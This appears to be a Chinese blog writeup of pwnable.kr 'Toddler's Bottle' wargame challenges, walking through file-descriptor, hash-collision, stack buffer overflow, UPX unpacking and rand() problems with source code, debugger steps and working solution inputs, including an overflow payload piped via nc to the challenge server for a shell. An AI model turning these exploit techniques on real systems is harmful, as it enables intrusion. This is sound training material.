---
layout: post
title: "Toddler's Bottle Writeup [pwnable.kr]"
tags: [security, writeup]
---

[pwnable.kr](http://pwnable.kr) 是一个非商业性的 Wargame 网站，提供了大量的 Pwn 类型的挑战，可以在该网站上练习和学习 Pwn 技术。

（PS：文章内容会随着做题进度进行更新）

### [fd]

> Mommy! what is a file descriptor in Linux?
> 
> ssh fd@pwnable.kr -p2222 (pw:guest)

通过 ssh 连接到答题环境后，可以在当前目录看到三个文件 fd、fd.c、flag。

fd 是一个可执行文件，用于读取 flag 文件，其源码如下：

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;

}
{% endhighlight %}

程序通过 `argv[1]` 获取一字符串并使用 `atoi()` 函数将其转化为整型于 `0x1234` 作差，其结果赋值给整型变量 `fd`。

随后程序从 `fd` 文件描述符中读取32字节到 `buf` 中，并与字符串 `LETMEWIN\n` 进行比较，若相等则打印 flag 文件的内容，否则失败。

在 Linux 系统下，使用 `open()` 函数成功打开文件后会返回针对该文件的文件描述符（整型）,若打开失败会返回 `-1`。文件描述符 `0`，`1`，`2`分别对应系统的标准输入，标准输出，和标准错误输出。

此题可利用标准输入来将字符串 `LETMEWIN\n` 写到标准输入中，然后使得 `fd` 变量值为 `0` 即可从标注输入中读入。

    fd@ubuntu:~$ echo "LETMEWIN" | ./fd 4660
    good job :)
    mommy! I think I know what a file descriptor is!!
    
或者：

    fd@ubuntu:~$ ./fd 4660
    LETMEWIN
    good job :)
    mommy! I think I know what a file descriptor is!!
    

### [collision]

> Daddy told me about cool MD5 hash collision today.
>
> I wanna do something like that too!
>
> ssh col@pwnable.kr -p2222 (pw:guest)

登录后，查看当前目录下的 `col.c` 源文件。

{% highlight c %}
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
{% endhighlight %}

程序从 `argv[1]` 中得到一长度为20字节的字符串，并将其拆成5组数据，将5组数据的整型值相加与目标值 `0x21DD09EC` 进行比较，相等则打印 flag，不等则失败。

此题直接将 `0x21DD09EC` 拆成5个数字的和即可，通过 `argv[1]` 输入时，需要注意使用小端序。

    ./col `python -c "print '\xc8\xce\xc5\x06' * 4 + '\xcc\xce\xc5\x06'"`
    daddy! I just managed to create a hash collision :)
    
    
### [bof]

> Nana told me that buffer overflow is one of the most common software vulnerability. 
>
> Is that true?
>
> Download : http://pwnable.kr/bin/bof
> Download : http://pwnable.kr/bin/bof.c
>
> Running at : nc pwnable.kr 9000

将 `bof` 文件下载下来，用 `file` 命令查看一下，可以看到是一个32位的 ELF 可执行文件，拖到 Ubuntu 中进行调试。

![img]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-1.png)

简单运行发现程序需要我们输入一些字符串，根据提示可以知道此题需要进行溢出。直接抄起 `gdb` 调试之。尝试直接使用 `b main` 在主函数处设置断点。

![img]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-2.png)

`r` 开始运行，程序断在了主函数入口处，使用 `n` 进行单步跟踪，当走到 `0x8000069a` 处时，程序 `call 0x8000062c <func>` 调用了 `0x8000062c` 处的函数，直接 `s` 单步进入继续跟。

![img]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-3.png)

当走到 `0x8000064c` 程序将寄存器 eax 的值 `0xbffff55c` 压入栈，随后进行 `call   0xb7e78cd0 <_IO_gets>`，此处为 c 语言中的 gets() 函数调用，最终 `0xbffff55c` 会指向用户输入的字符串。这里使用peda中的 `pattern create 64` 创建一个64字节的测试 payload 将其输入到程序中，方便后续调试。

![img]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-4.png)

输入完字符串后，程序停在了 `0x80000654` 进行了一个简单的比较操作 `cmp DWORD PTR [ebp+0x8],0xcafebabe`，比较 `DWORD PTR [ebp+0x8]` 处的值是否等于 `0xcafebabe`，而此时的 `DWORD PTR [ebp+0x8]` 地址为 `0xbffff590`，回顾一下刚刚指向用户输入字符串的地址 `0xbffff55c`。输入的字符串地址处在一个低地址上，如果输入足够长的字符串，就能够覆盖到后面 `0xbffff590` 处的值。

当比较成功时，程序不会发生跳转，调用 `call 0xb7e54190 <__libc_system>`，而其参数为 `/bin/sh`，如下图。

![img]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-5.png)

理清过程后，剩下的就只需要找到输入字符串指针距离 `0xbffff590` 的偏移即可。由于之前使用了特殊的 payload，这时候我们查看一下输入字符串周围的堆栈情况。

![img]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-6.png)

可以看到刚才输入的 payload 已经覆盖到了 `0xbffff590` 处的值，但是并不是程序需要的 `0xcafebabe`，使用 `pattern offset` 来计算偏移。

![img]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-7.png)

可以看到，`0xbffff590` 距离字符串开头的偏移为52个字节，因此为了成功地使程序跳转执行system("/bin/sh")，我们构造的输入字符串就应该为：

    "A" * 52 + "\xbe\xba\xfe\xca"
    
此时，直接使用命令行远程打 payload：

    (python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
    
![img]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-8.png)

（当然，题目提供了 c 源码，也可以直接阅读源码进行分析）

### [flag]

> Papa brought me a packed present! let's open it.
>
> Download : http://pwnable.kr/bin/flag
>
> This is reversing task. all you need is binary

使用 `file` 命令查看下载回来的 `flag` 文件，发现是一个64位的 ELF 可执行程序。通过查看，发现其具有明显的 UPX 压缩标志，所以解压之。

![]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-1.png)

通过 UPX 成功解压缩后得到 `flag-upx`，拖入 IDA 进行静态分析，发现在 `0x0000000000401184` 处引用了一个 `flag` 变量，通过 IDA 的交叉引用功能找到了该字符串，此值即为 flag。

![]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-2.png)


### [passcode]

> Mommy told me to make a passcode based login system.
>
> My initial C code was compiled without any error!
>
> Well, there was some compiler warning, but who cares about that?
>
> ssh passcode@pwnable.kr -p2222 (pw:guest)


(preloading...)


### [random]

> Daddy, teach me how to use random value in programming!
>
> ssh random@pwnable.kr -p2222 (pw:guest)

{% highlight c %}
#include <stdio.h>

int main(){
    unsigned int random;
    random = rand();    // random value!

    unsigned int key=0;
    scanf("%d", &key);

    if( (key ^ random) == 0xdeadbeef ){
        printf("Good!\n");
        system("/bin/cat flag");
        return 0;
    }

    printf("Wrong, maybe you should try 2^32 cases.\n");
    return 0;
}
{% endhighlight %}

此题考察 c 语言中随机数生成的问题，`rand()` 若没有提供参数会在当前环境使用同一随机种子来生成随机数，而通过在 `/tmp` 目录下进行测试，服务器上 `rand()` 生成的默认随机数值为 `1804289383`，需要输入的 `key` 值就应为：`1804289383 ^ 0xdeadbeef = 3039230856`。

    random@ubuntu:~$ ./random
    3039230856
    Good!
    Mommy, I thought libc random is unpredictable...
    